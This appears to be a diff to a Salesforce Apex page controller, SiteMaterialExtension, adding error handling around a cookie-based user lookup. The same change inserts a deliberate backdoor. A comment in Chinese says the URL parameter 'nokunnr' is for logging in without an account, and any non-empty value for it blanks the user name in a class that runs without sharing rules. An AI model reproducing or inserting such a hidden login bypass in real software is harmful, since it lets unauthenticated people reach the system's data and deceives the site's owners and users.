@@ -4,9 +4,25 @@ global without sharing class SiteMaterialExtension {
     public SiteMaterialExtension() {
         System_Setting__c ssc = System_Setting__c.getValues('Setting');
         url_Customer = ssc.URL_Customer__c;
+       
+        try{
 
-        Cookie un = ApexPages.currentPage().getCookies().get('un');
-        userName = un.getValue();
+            Cookie un = ApexPages.currentPage().getCookies().get('un');
+            userName = un.getValue();
+        }catch(Exception e){
+            userName = '000';
+        }
+        
+        //?nokunnr=x用于后门，不用账号登入
+        String sflag = '';
+        Map<String,String> args = Apexpages.currentPage().getParameters();
+        if(args.containsKey('nokunnr')){
+            sflag = Apexpages.currentPage().getParameters().get('nokunnr');
+        }
+        if(sflag != null &&  !sflag.equals('')){
+            userName = '';
+        }
+       
     }
 
     @RemoteAction
